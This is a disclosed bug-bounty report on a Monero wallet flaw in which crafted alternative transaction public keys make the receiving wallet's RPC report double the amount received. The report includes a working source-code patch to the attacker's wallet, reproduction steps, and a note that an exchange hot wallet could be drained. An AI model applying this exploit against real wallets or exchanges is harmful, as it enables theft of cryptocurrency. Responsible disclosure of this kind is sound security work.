# Attcker can trick monero wallet into reporting it recived twice as much with alternative tx_keypubs

## Report Details
- **Report ID**: 379049
- **URL**: https://hackerone.com/reports/379049
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-07-08T00:06:19.804Z
- **Disclosed**: 2018-07-27T21:28:34.494Z

## Reporter
- **Username**: phiren
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: monero

## Vulnerability Information
**Summary:** multiple identical  tx_pub_keys were patched, but you can still use alternative tx_pub_keys to get the same result.

**Description:** An attacker can craft an XMR transaction which causes the receiving wallet to report that it received twice as much XMR as the attacker actually sent.

The balance of the wallet isn't effected, so a personal user probably won't be ticked, however the doubled amount is reported over the get_transfers RPC call.

This is especially devastating for automated wallets, such as cryptocurrency exchanges that rely on RPC calls returning the correct result. 

This attack is a slight modification of the previous flaw that was patched in pull request 3985. That flaw allows unlimited multiplication of funds, instead of just a 2x multiplication that this attack allows.

This attack leverages the alternative tx_pub_keys feature introduced with subaddresses. extra data is arranged so it contains:

1. A dummy tx_pub_key
2. An array of alternative tx_pub_keys entries all containing the legitimate txkey for each output.
3. The legitimate tx_pub_key

The process_new_transaction function will:

1. Grab the dummy tx_pub_key
2. Grab the array of alternative tx_pub_keys
3. Scan all the outputs with both the dummy and alternative tx_pub_keys. Which will match on the legitimate tx_pub_keys.
4. Loop back to the start, grab the legitimate tx_pub_key
5. Since the alternative keys were not added into the public_keys_seen set, it scans all the outputs again.
6. Hacked.
 
## Releases Affected:

 * Monero master ebf2818ab5f42b10745cb99d07920f3197c3d914
 * Monero 0.12.3.0 release tag
 * Probably any Monero release since subaddresses were introduced

## Steps To Reproduce:

  1. On the attacking wallet, Patch cryptonote_tx_utils.cpp
```
    diff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp
    index 071ce591..3835690a 100644
    --- a/src/cryptonote_core/cryptonote_tx_utils.cpp
    +++ b/src/cryptonote_core/cryptonote_tx_utils.cpp
    @@ -351,9 +351,15 @@ namespace cryptonote
           txkey_pub = rct::rct2pk(hwdev.scalarmultBase(rct::sk2rct(tx_key)));
         }
         remove_field_from_tx_extra(tx.extra, typeid(tx_extra_pub_key));
    -    add_tx_pub_key_to_extra(tx, txkey_pub);
    +    crypto::public_key dummy_key;
    +    add_tx_pub_key_to_extra(tx, dummy_key);
    
         std::vector<crypto::public_key> additional_tx_public_keys;
    +    for (size_t i = 0; i < destinations.size(); i++)
    +      additional_tx_public_keys.push_back(txkey_pub); // One for each output.
    +
    +    add_additional_tx_pub_keys_to_extra(tx.extra, additional_tx_public_keys);
    +    add_tx_pub_key_to_extra(tx, txkey_pub);
    
         // we don't need to include additional tx keys if:
         //   - all the destinations are standard addresses
    @@ -421,9 +427,9 @@ namespace cryptonote
           output_index++;
           summary_outs_money += dst_entr.amount;
         }
    -    CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, "Internal error creating additional public keys");
    +    //CHECK_AND_ASSERT_MES(additional_tx_public_keys.size() == additional_tx_keys.size(), false, "Internal error creating additional public keys");
    
    -    remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));
    +    //remove_field_from_tx_extra(tx.extra, typeid(tx_extra_additional_pub_keys));
    
         LOG_PRINT_L2("tx pubkey: " << txkey_pub);
         if (need_additional_txkeys)

  2\. Compile wallet
  3\. Do a regular transfer to an exchange wallet.
  4\. Profit.

## Impact

By depositing and withdrawing the same coins, doubling each time; The attacker could eventually steal all XMR from an exchange hotwallet.

## Attachments
No attachments
